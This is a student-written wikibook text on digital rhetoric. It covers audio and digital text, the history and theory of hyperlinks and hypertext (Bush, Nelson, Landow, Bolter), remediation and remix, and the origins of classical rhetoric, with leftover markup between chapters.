The widespread accessibility of television, radio and, perhaps most significantly, the Internet, coupled with the proper presentation, has made it so that the most awkward of public speakers can inspire and make their voice heard.

Throughout the years, there have been a number of speeches that have touched peoples' lives. Words have had the capability to move people emotionally that no other form of delivery has had. The spoken word, properly presented and supported with strength and conviction, still holds sway in every aspect of life as strongly as it did when the nations weren't connected by the World Wide Web. 

Words are a strong sense of persuasion and some things cannot be communicated effectively without the use of words. Writing and other flat pieces of rhetoric simply do not have the power to persuade individuals like the strength of a person's speech. Imagine some of the greatest leaders in the world and their ability to sway people's opinion based on their passion expressed through speech.

Speech has reached a new degree in the digital world. Today you can find videos, websites, and online tutorials that really emphasize the use of audio in a rhetoric form.

It is difficult to deny a well formatted audio argument but with the enhancements of screen capabilities and graphics it is even more difficult. Audio is what allows ideas to move from the mind out into society in a faced paced rhetorical manner.

This YouTube video is a prime [http://www.youtube.com/watch?v=k_1EAgbdnoA example] of the impact audio can have in relation to digital rhetoric.

== '''Text''' ==



The word text refers to both written and spoken; but in our wiki, text is referred to as written.  In the publishing world, illustrations and photos are often part of text.  Text is a product and a structure not a process ([http://jodi.tamu.edu/Articles/v06/i01/Hillesund/ Digital Text Cycles]).  Text is also part of a long process (writing, distributing, and reading).  Text is part of a text cycle.  Over the centuries, we have seen text evolve from oral to written, from written to print, and now print to digital. 
 

We are currently in the world of the digital text.  The process of getting text is the same; however, we see and read the text with computers, networks and monitors.  The transition from paper to screen started in the second half of the 20th century.  By using a computer, we can change the overall look of the text.  We can change the font style, color, size, and placement.  Digital text is found all around us (web sites, email, and word processing are just a few to name).  “Digital text is “malleable,” and can be transformed into other types of media” ([http://www.alltech-tsi.org/resources/digital-text.php Digital Text]).
 

Over the years since the computer and using websites has become extremely popular, so has the word hypertext.  Hypertext is a type of text that contains a link to other links.  By clicking on a certain word or phrase, you will be taken to a new page (which it can contain more text, graphics, video, or even sound).  The new page will be relevant to what you were reading about.  It makes life much easier to just click and be taken to the page you want instead of going on a scavenger hunt to find more information on what you were looking up.  Unlike regular text, hypertext is a concept, not a product.


Digital text can be transformed into:  braille, synthesized speech, digital audio books, or large print ([http://www.alltech-tsi.org/resources/digital-text.php Digital Text]).  It is also starting to change the learning experience for students.  Students can find books and articles online, as well as, using a word processor to write papers.  Digital text has had a positive effect on students with learning and reading disabilities.


Here is an [http://www.youtube.com/watch?v=T7rqr0Hjf28&amp;feature=PlayList&amp;p=C11E63D942BA66C2&amp;playnext=1&amp;playnext_from=PL&amp;index=2 example] from YouTube on digital text.



== '''Conclusion''' ==

In the ever-changing environment of rhetoric a new rhetoric that interacts with visual audio and text rhetoric has formed. This rhetoric is being defined as digital rhetoric. Digital rhetoric is a collaboration of different forms of media and mediums along with the collaboration of people. 


Visuals tend to be the background to what is being explained either by an audio message or in written text. Visuals help the reader to understand concepts further. Visuals are often [http://img.metro.co.uk/i/pix/2007/10/menezessplit_450x382.jpg manipulated] for persuasive appeal. Digital Rhetoric allows these processes to take place and then combine with other concepts such as audio or text to create the most persuasive means possible. 


Text takes on a whole new look. The color, size, and font style become more important and contribute to the visual appeal that text can offer. Text in the realm of certain digital media such as video or photography, offers the ability to intensify a meaning. 

This YouTube clip shows the relationship differences that are made when you move from text or [http://www.youtube.com/watch?v=wMkRH94KrfA&amp;feature=related linear thinking to visual thinking]. 

Audio clips are the underlying explanations in digital rhetoric. In most instances, the audio is typically of a song or person speaking that offers an analysis of entertainment to the medium or media. Audio messages can also be mixed with other audio messages creating a new audio message that may offer a new meaning.

'''''[http://en.wikipedia.org/wiki/Hyperlink Hyperlink]:''''' usually shortened to link, is a directly followable reference within a hypertext document

'''''[http://en.wikipedia.org/wiki/Hypertext Hypertext]:''''' text, displayed on a computer, with references (hyperlinks) to other text that the reader can immediately follow, usually by a mouse click or keypress sequence



----



Whether you realize it or not, hypertext has affected the daily lives of average people. Anyone that uses the internet or checks email is affected.  Hypertexts and hyperlinks are now a part of society, and used on a daily basis.

== Hyperlinks ==
----

The concept of the hyperlink goes back to 1945 when [http://sloan.stanford.edu/MouseSite/Secondary/Bush.html Vannevar Bush] thought up the memex. The term hyperlink was created by Ted Nelson in 1965, and in 1989, Timothy Berners-Lee recognized the potential of the hyperlink as a tool and applied it to the World Wide Web. [http://www.lamberta.org/blog/hyperlink-brief-history/] Hyperlinks have been used on the Web since 1989. The principle behind the hyperlink is to 'link' two webpages, documents, or items and allow the user to move from one to another. 


So what is a hyperlink? Let’s start with what is a link. A [http://dictionary.reference.com/browse/link?qsrc=2888 link] is anything serving to connect one part or thing with another. So if we look at a link, and know that a hyperlink is often shortened to just 'link' then a hyperlink is a connection between two or more documents, webpages, items, etc.  


Hang Woo Park of YeungNam University and Mike Thelwall of the University of Wolverhampton co-authored [http://jcmc.indiana.edu/vol8/issue4/park.html “Hyperlink Analysis of the World Wide Web: A Review”] in the 2003 ''Journal of Computer-Mediated Communication''. This article reviews the Hyperlink Network Analysis (HNA) and Webometrics. HNA understand hyperlinks as casts links between Web sites with ties to Social Networks. Webometrics applies simpler techniques with a more in-depth focus on the hypotheses about possible interpretations of the results. The motivation for this research is the increasing importance of the Web as an “ever-broader” spectrum of human activities, which need to be more widely developed and exploited. Park and Thelwall discuss many sources for understanding hyperlinks and reveal the complex and problematic analysis of the hyperlink as a tool.


Hyperlinks have become widely popular and accepted over the last twenty years. Everyday programs such as Microsoft Word allow in-text hyperlinks for references to other documents, websites, and indexes. People have become so familiar with hyperlinks that there is no need for standardization. Initially, all hyperlinks on the Web had to be blue with underlining; however, their common use on the Web makes the typical blue underlining unnecessary. As long as the hyperlink is distinguishable from the text, they can be any color, size, emphasis, etc. 


One of the major debates of hyperlinks is the concept of new windows or new tabs. New Web browsers offer tabbed windows, which is a helpful feature when viewing more than one website. Usually a hyperlink opens in the users current window, but many Web designers are now using the target=&quot;_blank&quot; code to open the hyperlinks in new windows or tabs to prevent the user from losing their current page. This is helpful when a hyperlink leads off of the current site to an outside source, but is not always necessary. The big debate is whether the new window feature should be a standard function or an option for Web designers. Is this a functional tool, or just a personal preference? 


'''Examples'''
----
1. In text: In text hyperlinks are words or phrases within a section of text that leads the user to another webpage. For example: The [http://en.wikipedia.org/wiki/Statue_of_Liberty Statue of Liberty] is located in [http://en.wikipedia.org/wiki/New_York_City New York City]. 

2. Navigation: Navigation hyperlinks are usually located on the left or right of the content. These hyperlinks will allow the user to move through the current website. For example: The blue links on the left side of this screen are navigational hyperlinks.

3. Internal: Internal hyperlinks are links to pages within the current website. 

4. External: External hyperlinks are links to pages outside of the current website. For Example: [http://www.jmu.edu/ James Madison University]

== Hypertexts ==
----
Hyperlinks should not be confused with hypertexts. The term hypertext is a relatively new term that is not well known to the general population. For that matter, there is no consensus of what hypertext includes. Several individuals have written books, articles, and websites that try to explain the concept of a hypertext. 


''' A Brief History ''' 
----
At the end of World War II, Vannevar Bush, the Director of the Office of Scientific Research and Development, saw the need for an instrument that could retain and recall the sum of human knowledge. In [http://sloan.stanford.edu/MouseSite/Secondary/Bush.html ''As We May Think''], published in The Atlantic Weekly in July of 1945, Bush discusses the potential (and futuristic for the time) inventions and instruments that would better world communication.  In his article he mentions digital photography, credit cards, digital archives, computers, and most importantly, the memex. 


The memex is a Utopian device that stores all books, records, and communications which can be consulted with speed and flexibility to tie two items together ([http://sloan.stanford.edu/MouseSite/Secondary/Bush.html Bush] 8-9). Bush’s imagination in the mid-1940’s has mostly come true in the present time, and his theories/suggestions are the foundation of hypertext and web theorists. Two crucial elements of Bush’s memex are the ability to append one’s own thoughts and reactions to the text, and the ability to attach annotations virtually ([http://books.google.com/books?id=qqdomnPTL9cC&amp;dq=george+landow&amp;printsec=frontcover&amp;source=bl&amp;ots=T6WF1XEHFS&amp;sig=Hvtw7ZcdhEpt5ztru9lAEiGk1j4&amp;hl=en&amp;ei=6hbJSYaoO4-UMtfI2eoD&amp;sa=X&amp;oi=book_result&amp;resnum=6&amp;ct=result Landow] 11). The memex, as theorized by Bush, relies on associations made by the machine automatically, creating endless trails of links for any topic ([http://books.google.com/books?id=qqdomnPTL9cC&amp;dq=george+landow&amp;printsec=frontcover&amp;source=bl&amp;ots=T6WF1XEHFS&amp;sig=Hvtw7ZcdhEpt5ztru9lAEiGk1j4&amp;hl=en&amp;ei=6hbJSYaoO4-UMtfI2eoD&amp;sa=X&amp;oi=book_result&amp;resnum=6&amp;ct=result Landow] 11).  Bush saw an miraculous device that had the potential to store all of the world's information interlinked, annotated, and available to everyone.


Hypertexts originally emerged as electronic stories. [http://www.eastgate.com/ Eastgate Systems Inc.] is the leading company for hypertext development. Their website offers information about hypertexts, software for designing hypertexts, and hypertext stories. [http://www.eastgate.com/Edge.html Cutting Edge] is part of the Eastgate website that offers articles on current hypertext topics and concerns. Some of the more prominent articles cover hypertextual layouts and navigation. While some initial concerns about hypertext stories included the fear of forgetting the novel, the last ten years has proven this fear to be false. Problems of navigation and cohesion on the other hand are still relevant to discussion. 

Others areas considered for discussion are the development of vocabulary for the structures and concepts that explain how today's hypertext works as well as websites. Many issues up for discussion are the patterns of hypertext, the aesthetics involved, and polyvocal hypertexts. 


''' An Emerging Technology '''
----
As an emerging technology, theories and standards for hypertexts are still a work in progress. W3C's homepage for XHTML2, [http://www.w3.org/MarkUp/ The Working Group], was chartered in March 2007 to fulfill the promise of XML for applying XHTML to plethora of platforms with special attention to internalization, accessibility, document structuring and usability.  W3C working groups and the Members of the Consortium reach a census together on what is the specification for various syntaxes. These become building blocks for the future markup languages made available for widespread use. These members provide knowledge for creating an appropriate model to use when coding. 


A similar website that fosters forums between communication professionals is by [http://text100.typepad.com/ HYPERtext] by Text 100. Technology PR consultants work towards engaging members in discussion about emerging mainstream technology and their trends.  Text 100 continues with a similar theme of constant discussions similar to W3C’s consistent research. Text 100 allows for discussion between media, analysts, investors, industry influencers, and social media visionaries. 


When considering the possibilities the future holds for hypertext it is pertinent to also consider the beginnings of hypertext. In [http://www.class.uidaho.edu/narrative/hypertext/hypertext_and_beyond.htm “''Hypertext and Beyond''”] Jesse Woods discusses the early ideas of hypertext which were made possible by [http://sloan.stanford.edu/MouseSite/Secondary/Bush.html Vannevar Bush] in 1945. He had proposed a machine, memex, for displaying and organizing information in a non-linear form. It would be a true digital library. Bush’s theories were before computers had been feasible, and it was his ideas which were studied by early computer pioneers. With constant change in technology and our abilities to communicate authors are following up with new idea for telling their stories. 


While initial theories were based on stories and electronic novels, the changes to the internet over the last ten years has created a new environment for all types of hypertexts to thrive. Elements of hypertexts can be found in [http://keithaharmon.wordpress.com/ blogs], wikis, and basically every webpage. Web 2.0 (or possibly Web 3.0) has allowed hypertextual characteristics to become a part of everyday Web use.  


'''Hypertext Theories''' 
----
George Landow is one of such theorist. Landow says that the two crucial elements of Bush’s memex are the ability to append one’s own thoughts and reactions to the text, and the ability to attach annotations virtually. In [http://books.google.com/books?id=qqdomnPTL9cC&amp;dq=george+landow&amp;printsec=frontcover&amp;source=bl&amp;ots=T6WF1XEHFS&amp;sig=Hvtw7ZcdhEpt5ztru9lAEiGk1j4&amp;hl=en&amp;ei=6hbJSYaoO4-UMtfI2eoD&amp;sa=X&amp;oi=book_result&amp;resnum=6&amp;ct=result Hypertext 3.0], Landow discusses various definitions of hypertext, and explains that a there are several characteristics that make a hypertext, but not all hypertexts have to have all characteristics. 


In his book [http://books.google.com/books?id=t2Q8dIDIsNUC&amp;dq=Jay+bolter+writing+space&amp;printsec=frontcover&amp;source=bn&amp;hl=en&amp;ei=4EjSSdO_NJ3slQfvuayOBw&amp;sa=X&amp;oi=book_result&amp;resnum=4&amp;ct=result#PPP1,M1 ''Writing Space: Computers, Hypertext, and the Remediation of Text''], Jay Bolter discusses how hypertextual features on the Web has resulted in a new writing space for authors. The book discusses the changes in writing styles, authorship, remediation, literature, and culture.  


Landow and Bolter are two of the leading theorists of hypertexts and Web 2.0. Some of the major issues of hypertext include: 
*Death of the novel: initial responses to the hypertext fiction led many theorists to believe that the printed novel would become less frequent. 
*[http://en.wikibooks.org/wiki/Authorship Death of the author]: As discussed in class, the death of the author has been a concern in literary circles for some time. Many theorists question the authorship of hypertextual documents (such as blogs and wikis).
*Intuitive navigation: because hypertexts were originally theorized to be chaotic, the topic of navigation is a touchy subject to many individuals. Some like the idea of chaotic navigation, while others prefer a slightly more organized approach. However, all parties agree that in order to be hypertextual, there must be many available pathways. 
*Web 3.0: Landow mentions in is book, that the hypertextual elements and multi-media approaches have created a new Web environment. 
*Re-theorizing: Much of the original theorizing on hypertexts took place in the early 1990s. Since then, much has changed. The web is changing the daily lives of average people. With the changes, theorists are beginning to develop new ideas and concepts.

In Landow’s [http://books.google.com/books?id=qqdomnPTL9cC&amp;dq=george+landow&amp;printsec=frontcover&amp;source=bl&amp;ots=T6WF1XEHFS&amp;sig=Hvtw7ZcdhEpt5ztru9lAEiGk1j4&amp;hl=en&amp;ei=6hbJSYaoO4-UMtfI2eoD&amp;sa=X&amp;oi=book_result&amp;resnum=6&amp;ct=result ''Hypertext 3.0''], hypertext includes three definitions. Landow provides his own definition, and the definitions from Barthes and Nelson. According to Landow, hypertext, in terms of the Internet, is a text composed of blocks of texts or images linked by multiple paths, chains, or trails which are open-ended and continuously unfinished ([http://books.google.com/books?id=qqdomnPTL9cC&amp;dq=george+landow&amp;printsec=frontcover&amp;source=bl&amp;ots=T6WF1XEHFS&amp;sig=Hvtw7ZcdhEpt5ztru9lAEiGk1j4&amp;hl=en&amp;ei=6hbJSYaoO4-UMtfI2eoD&amp;sa=X&amp;oi=book_result&amp;resnum=6&amp;ct=result Landow] 2). Barthes explains hypertext as an ideal text, where several networks interact with a text that has no main entrance or beginning. This ideal text contains multiple texts, is interactive, and unpredictable to the user ([http://books.google.com/books?id=qqdomnPTL9cC&amp;dq=george+landow&amp;printsec=frontcover&amp;source=bl&amp;ots=T6WF1XEHFS&amp;sig=Hvtw7ZcdhEpt5ztru9lAEiGk1j4&amp;hl=en&amp;ei=6hbJSYaoO4-UMtfI2eoD&amp;sa=X&amp;oi=book_result&amp;resnum=6&amp;ct=result Landow] 2). The third definition of hypertext by Theodore Nelson, who coined the term “hypertext,” explains it as a non-sequential writing, which branches and allows the user to interact with the writing by choosing the best path ([http://books.google.com/books?id=qqdomnPTL9cC&amp;dq=george+landow&amp;printsec=frontcover&amp;source=bl&amp;ots=T6WF1XEHFS&amp;sig=Hvtw7ZcdhEpt5ztru9lAEiGk1j4&amp;hl=en&amp;ei=6hbJSYaoO4-UMtfI2eoD&amp;sa=X&amp;oi=book_result&amp;resnum=6&amp;ct=result Landow] 2-3). 


Everything on the web has some element of hypertext. According to the definitions, a true hypertext

*Combines linked texts and images

*Has no beginning and no end

*Contains many entrances and exits

*Is interactive with users

*Is unpredictable 

*Is discontinuous

*Is not linear


'''Format and Design''' 
----
Chapter 5 of Jakob Nielsen's book [http://www.useit.com/papers/hypertext_theory/ ''Multimedia and Hypertext: The Internet and Beyond''], discusses the architectural component of hypertext systems. Nielsen divides the hypertext system into three levels. There is the presentation level (user interface), the hypertext abstract machine level known as HAM (nodes and links), and the database level (storage,shared data, and network access). Although currently most hypertext systems don't follow this model, they are typically a &quot;confused mix of features&quot;. 


Many hypertext systems are essentially hypertext engines that are able to display an array of hypertext documents. Systems built to display a single document can therefore provide a richer interaction for the user with a single piece. There are hypertext researchers that can work with systems designed as hypertext systems, as well as many other researchers who work with systems that assist them in performing all sorts of tasks. There can be a conflict between these two ideas and as a result a new approach is called open hypertext. Open hypertext is aimed at integrating hypertext capabilities along with the entire user's software environment. There was The Microcosm Project which looked into the three degrees of application for open hypertext, but has not been perfected and will continued to be researched.


'''Examples'''
----
1. The best example of a true hypertext is [http://en.wikipedia.org/wiki/Main_Page Wikipedia]. Wikipedia is a co-authored site that allows users to write, edit, comment, and annotate. A user can enter the site through any page and they can exit at any page. There is no set beginning or end, and a user can move through the seemingly unending site by using navigation links, searches, or in-text links. 

2. The original hypertexts were electronic stories and novels. The navigation and movement through the stories will vary, but one example is [http://www.hypertext.net/rhizome/essay/ Rhizome].

== Connections to Digital Rhetoric ==
----
A hypertext is one of many virtual platforms for [http://en.wikibooks.org/wiki/Introducation_of_Digital_Rhetoric_to_Rhetorical_Practices digital rhetoric]. Hypertexts are the reason behind the success of digital rhetoric. The theories, concepts, and environments created by hypertexts have nurtured the designs, styles, and methods of digital rhetoric. 


'''Examples'''
----
1. [http://en.wikibooks.org/wiki/Context Web 2.0/3.0 environment] - The features and abilities that web designers can use in the web environments go beyond the initial purpose and functions of the Web. Video, audio, graphics, color, links, etc., all aid in the development of digital rhetoric.

2. Concepts - Many people think of hypertexts as chaos... but it's not. Some of the initial theories stated that hypertexts should have a chaotic theme to them, but (fortunately) web designers realized that the mass audience does not what a chaotic environment. While there can be elements of chaos, the overall navigation, content, and design should have enough order to function properly.

      <text xml:space="preserve">== '''Introducing Remediation and Remix''' ==

With technology continuously changing, there are new and different methods of media developing all around us. Every day, a new method is created and tested by millions without them even knowing about it. Imagine listening to your radio and you hear the all-time popular song ''Thriller'' by Michael Jackson. However, it has been changed by adding extra catchy up-beat tunes in the background. It's not what you remember originally, but the [http://www.youtube.com/watch?v=bKbbiVXk8r0 new remix] is aesthetically pleasing.

What is this new technology? Is it okay to change the original form to something new? Does it change the meaning of the work? Who should be given credit: the original author or the new editor? Within this short discussion, we will define remediation and remix and its association with digital rhetoric. Remediation and remixing allows society to change and improve existing formats of different text. These changes are created using new tools available through advancements in technology. With these tools, such as Twitter, Flickr, and YouTube, it is easier than ever to create your own interpretation of an already existing text.

== '''What is Remediation and Remix?''' ==

[http://www.amazon.com/Remediation-Understanding-Jay-David-Bolter/dp/0262522799 Jay David Bolter and Richard Grusin] offer a theory of mediation for our digital age that challenges this assumption. They argue that new visual media achieve their cultural significance precisely by paying homage to, rivaling, and refashioning such earlier media as perspective painting, photography, film, and television. They call this process of refashioning &quot;remediation,&quot; and they note that earlier media have also refashioned one another: photography remediated painting, film remediated stage production and photography, and television remediated film, vaudeville, and radio.

[http://en.wikipedia.org/wiki/Mediation_(Marxist_theory_and_media_studies)#Remediation Remediation] is the remediation of other *things*. It gives the viewer the option of seeing the current version and previous versions of the work, while creating a new version. Furthermore, the second remediation will depend on the first mediation, and so on. Of course, when referring back to previous versions, it is helpful to know the author and other helpful source information (include hyperlink to AUTHOR section). The goal of remediation is to refashion or rehabilitate other media. Furthermore, all mediations are both real and mediations of the real, remediation can also be understood as a process of reforming reality as well.

[http://en.wikipedia.org/wiki/Remix#Remix_in_literature Remixing] is similar to remediation, as it is the alternate version of the original. We often think of remixing when referring to music. However, remixing can be seen in all types of formats, such as graphics, visuals, speech, and audio. The success in a remix is changing the original version into something new or different. One form of remixing other than music is remixing literature. William Burroughs used the technique of remixing language in the 1960s in what he called &quot;Cut-Ups&quot; -- various textual sources (including his own) would literally be cut into pieces with scissors, rearranged on a page, and pasted to form new sentences, new ideas, new stories, and new ways of thinking about words. Other examples of remixing literature are seen in Pixel Juice (2000) by Jeff Noon who later explained using different methods for this process with Cobralingus (2001). Nigel Tomm's self-published remixes of Shakespeare's work are Shakespeare's Sonnets Remixed (2006), Shakespeare's Hamlet Remixed (2006), Shakespeare's Romeo and Juliet Remixed (2007).


=='''The History of Remediation and Remix''' ==

In the early 1990s, a greater extent than at any time since the 1930s, Hollywood produced numerous filmed versions of classic novels. Some of the adaptations are quite free and are historically accurate and faithful to the original novels. Yet the Austen films do not contain any overt reference to the novels on which they are based: they do not acknowledge that they are adaptations. Acknowledging the novel in the film would disrupt the continuity and the illusion of immediacy that Austen's readers expect, for they want to view the film in the same seamless way in which they read the novels. The content has been borrowed, but the medium has not been appropriated. This kind of borrowing, extremely common in our culture today, is also very old. An example with a long pedigree would be paintings illustrating stories from the Bible or from other literary sources, where apparently only the story content is borrowed. The contemporary entertainment industry calls such borrowing [http://www.lcc.gatech.edu/~objork3/1101/remediation.pdf &quot;repurposing&quot;: to take a &quot;property&quot;] from one medium and re-use it in another. With reuse comes a necessary redefinition, but there may be no conscious interplay between media. The interplay happens, if at all, only for the reader or viewer who happens to know both versions and can compare them.


== '''Formats of Remediation and Remix''' ==

As literacy progressed, certain elements were added and incorporated, certain styles were adapted. Globalization has brought the world closer. Within a matter of seconds, someone in United States can instantly find out the breaking news in Iraq or someone in Korea could have watched President Obama's Inauguration speech live - all thanks to the internet. The internet has revolutionized the world in many ways. Advancements in technology have allowed people to be instantly connected to others that are across the world. Through blogging, people are now able to share opinions, discuss unique ideas in a wide range of topics, and broaden their horizons. In addition, anyone can choose to participate in a discussion or start a blog about their ideas and opinions. Once, it was thought that a person must be artistic to create something new. Nowadays, anyone can remix by adding or removing graphics, visuals, speech, audio, and others, and make a creative piece of their own. Many of these formats are witnessed and placed using websites such as YouTube, Facebook, or Twitter. 

Digital texts have an edge over classical rhetoric because with the help of certain other elements such as videos, graphics, sound, the argument in hand could be significantly persuasive. However, with classical rhetoric, other than the vernacular grammar, the way the speech is delivered, the argument in hand could be persuasive, but not attractive in front of digital texts. The issue of accessibility and usability are also important factors of digital texts.


== '''Examples of Remediation and Remix''' ==

This section will provide examples of Remediation and Remix through its different forms using technologies including websites, video clips, photographs, and print.


'''Websites'''

''Educational Purposes''

An example of a &quot;remixing&quot; is the [http://okapi.dreamhosters.com/remixing/mainpage.html Catalhoyk] website. This website certainly has many characteristics of digital rhetoric as the website uses the technologies of today to teach people about archaeological research in Central Turkey. It provides new and exciting learning methods that allow individuals to learn the material in a way that makes sense to them. It encourages visitors to share, download, remix, and republish the materials and resources provided through the website. The idea of experiencing culture of Catalhoyuk through visual images in the form of pictures and 3D visualization is just fascinating. The main website has many hypertexts that lead the user to a different realm. Each picture on the website has its own unique story – a story of either the people residing in Catalhoyuk today, people that once upon a time did live in the city, the efforts of archaeologists who are trying to discover and study the rich history of Catalhoyuk. On certain pages, there are short videos varying from describing the project the archaeologists are working on or goals they hope to discover from this project. The creators of the website even encourage users to upload a remix video of their own and add on to their “remix” project. 

The website states that all of the provided resources are covered under [http://creativecommons.org/  Creative Commons] NonCommercial Attribution 3.0 Licensing of Lawrence Lessig. The constraints that have surrounded us today, for instance, all the regulations placed on us or rules that we have to abide by, in the end, just succeed in limiting our creativity. Some of the oldest corporations have recycled past ideas and presented them in a unique manner. So, why is it that now we have to deal with copyrights and other endless rights, and in the end, sometimes unintentionally, faced with charges for breaking the law? [http://libreria.sourceforge.net/library/Free_Culture/CHAPTER07.html Lessig] mentions an interesting personal scenario where when recording a movie, he had to use a four point five seconds clip of “The Simpsons” playing in the background. When he contacted the owner, Lessig discovered that in order to use that small clip in his film, he would have to pay $10,000 to the company. This new licensing allows individuals to reuse the materials for noncommerial purposes as long as he or she accredits the author. Where the laws and regulations are limiting our creativity, Creative Commons is encouraging creativity by allowing people to broaden their horizons and expand. One of their many creative ideas include the changing of rights from “All Rights Reserved” to “Some Rights Reserved” copyright. This allows giving credit to the author of the idea, and allows other users to be inspired from that idea. It is definitely a manifestation of digital rhetoric, because there is creativity being assigned and utilizing rhetoric in a different medium. It is opening new doors for a whole generation of users.

Another website, [http://www.virtualmuseum.ca/Exhibitions/Danewajich/english/index.html Stories and Songs: Dreamers and the Land], there are clearly many characteristics of digital rhetoric. For instance, the idea of putting up pictures of each member of the team and the importance of the project to them, a virtual tour, and a slide show incorporated within the website. The circle element that was incorporated on the Dreamers section is important because by scrolling around the circle, we, as users are able to browse through several authors. Within each circle, there are more circles present, and each represents a different theme. Users can watch videos and listen to the people recite poetry. The virtual tour appears realistic because of the 360-degree view of the landscapes native people encounter daily. The interactive map takes the users to the stories and songs of a particular region. Users can browse through the website and learn about a different culture, traditions, people, all in the comfort of their own home. The fact that the website is interactive may entice younger audiences, while at the same time providing education and entertainment. 

Learn more about this new form of education: [http://www.virtualmuseum.ca/Exhibitions/Danewajich/english/index.html Stories and Songs: Dreamers and the Land]


These websites are examples of how technology can help and improve education, through its meaning and teachings. It also demonstrates the concept of ethnography now transcending from the traditional manner and jumping on to the digital bandwagon. Both these websites described cultures and at the same time incorporated digital rhetoric elements.


''Professional and Entertainment Purposes''

[http://secondlife.com/ Second Life] is becoming a popular new website where individuals can &quot;remix&quot; or create and change their virtual worlds. It has similar qualities as the Sims, where you create your own avatar and control its activities. Recently, multinational companies across the globe are taking advantage of this virtual world and creating their own virtual workplace, where users can communicate from at home or on travel without needing to go to the office.

'''Photographs'''

''Still Photographs''

Altering a photograph by a professional photograph is a thing of the past. Photographs can easily be &quot;remixed&quot; FREE by anyone today with the easy access and assistance of Adobe Photoshop or Adobe Illustrator. The altering of the original picture can be as simple as removing a scar with an eraser tool to the extreme of adding a foreign object, like the example shown below. 

[http://www.grygarness.com/photo_montage/remix/remix_01.jpg Flowering Mouth]


''Animated Photographs''

Another extremity is adding other technologies, changing the meaning and delivery of the photograph entirely. A person can add text, video, color, music and create an entirely new deliverable using the technologies we have available today. Slideshows will never be the same again. The video provided below is a prime example of how someone can remix a photograph.

[http://www.youtube.com/watch?v=5WvuSUKa5Qs Mondo Grosso - Everything Needs Love]


With remixing and remediation becoming more popular, there are websites that enable anyone to create their own remix. [http://www.example.com Animoto] puts an end to the typical slideshow, and creates a remix of with music, text, and highlights of favorite images. This video was created to enhance pieces with a portfolio for a designer. 

[http://en.wikibooks.org/w/index.php?title=Lindsay_Cannaday%27s_Remixing_Portfolio&amp;action=edit&amp;redlink=1 Remixing Portfolio]


'''Video Clips'''

Video clips are the most common format used with remediation and remixing. YouTube is the ultimate search engine for any remix imaginable. Here are a few examples establishing an original video with the remixed video right below. Take a look at these before and after clips and see if you can pick up on the extreme differences. 

[http://ccinsider.comedycentral.com/2009/01/09/colbert-debates-copyright-law-with-lawrence-lessig/ Stephen Colbert and Lawrence Lessig Interview Original]
[http://www.youtube.com/watch?v=f_w1FR67AXs The Stephen Colbert and Lawrence Lessig Interview Remix]


Another example is a video of a scene from the movie V for Vendetta. In this clip, the main character gives a monologue, which is known as the [http://www.youtube.com/watch?v=-OB6EsUP4tU&amp;eurl=http%3A%2F%2Fpz%2Dwriting%2Enet%2Fdigirhet%2F%3Fq%3Dblog%2F5&amp;feature=player_embedded alliteration speech.] In the second clip, the video is removed, and emphasis is placed on the [http://www.youtube.com/watch?v=c6Q0dfrbr10&amp;eurl=http%3A%2F%2Fpz%2Dwriting%2Enet%2Fdigirhet%2F%3Fq%3Dblog%2F5&amp;feature=player_embedded remix/movement of typography.] The typography changes according to the character's voice, pitch, and tone. For instance, as the character gets excited, the font increases in size, and when the character has a comical comment, the typography adjusted to it. 


'''Text'''

Even text today is changing into something no one ever imagined a decade ago. Today, it is a hard to find a single layered text. Meaning, most online text today is hyperlinked with more information, providing the user with a broader understanding of the topic. Primary examples of these text are [http://en.wikipedia.org/wiki/Main_Page Wikipedia], [http://www.cnn.com/  CNN], and other hypertextual websites. Observe the multiple layers on this [http://www.huffingtonpost.com/2009/02/02/poll-majority-of-republic_n_163166.html news website].

== '''Conclusion''' ==

Remediation and Remix are concepts that alters the original concept and yields a new text with a completely different meaning, and still open to interpretation. The users can view a text, in the multiple formats available, and interpret it according to their own personal views. For instance, the following video is a slideshow of pictures where the viewers are asked to interpret or look for details in each slide. However, after each slide, the author shared his interpretation, which typically would be different from yours. [http://www.youtube.com/watch?v=XNiXzvRcw6M Interpretation Video]

Remediation and remix are two important elements in the broad domain of digital rhetoric. Essentially, these two elements allow the users to be inspired from an idea, and through using different formats are able to create a completely new idea based on the new authors interpretation. Such new texts can be beneficial in professional settings, for instance, advertising purposes, presentations, and product promotions. These texts can also be implemented in educational settings where they can be used as tools for learning, for instance, teachers and professors can make learning more fun by using interactive media. 

Based on the ideas discussed in this section of digital rhetoric, we believe that through remediation and remix people can improve and enhance their social and professional lives. It has proven to be beneficial, and led to an increase in productivity. Overall, remediation and remix allows the average person to take an idea and promote it to his/her advantage through ways of persuasion, which equals a form of digital rhetoric.

      <text xml:space="preserve">Rhetoric has evolved from oration to print and from print to electronic texts; therefore, the ways we govern, practice, and theorize about rhetoric must change as well. These chapters explore the topics surrounding digital rhetoric and work towards a theory for connecting rhetorical practices to electronic texts.


==The History of Rhetorical Practices==

[http://www.merriam-webster.com/dictionary/rhetoric Rhetoric] is &quot;the art of speaking or writing effectively.&quot; [http://www.bedfordstmartins.com/bb/history.html Western traditions] of  rhetoric were founded in the ancient Greek culture. Classical rhetoric, which is associated with the growth of new governments and social movements, began with the development of Greek city-states, most importantly, Athens. According to Patricia Bizzell and Bruce Hersberg in ''The Rhetorical Tradition: Readings from Classical Times to the Present,'' classical rhetoric &quot;manages knowledge, conveying but not creating it.&quot; 


‎Great thinkers and orators like  [http://www.ucmp.berkeley.edu/history/aristotle.html Aristotle], created oral tradition and [http://plato.stanford.edu/entries/plato/ Plato] challenged the notions of form and reality. Aristotle created the [http://www2.iastate.edu/~honeyl/Rhetoric/index.html classical conventions] that governed rhetoric and brought life to the art of oration and public discourse. According to Aristotle, rhetorical discourse has three main areas: political, forensic, and the ceremonial oratory of display [http://classics.mit.edu/Aristotle/rhetoric.1.i.html (Rhetoric, Book One Part Three)]. Aristotle also created the five canons of rhetoric: [http://rhetoric.byu.edu/canons/Invention.htm invention], [http://rhetoric.byu.edu/canons/Arrangement.htm arrangement], [http://rhetoric.byu.edu/canons/Style.htm style], [http://rhetoric.byu.edu/canons/Memory.htm memory], and [http://rhetoric.byu.edu/canons/Delivery.htm delivery]. These conventions paved the way for rhetorical practices.
   

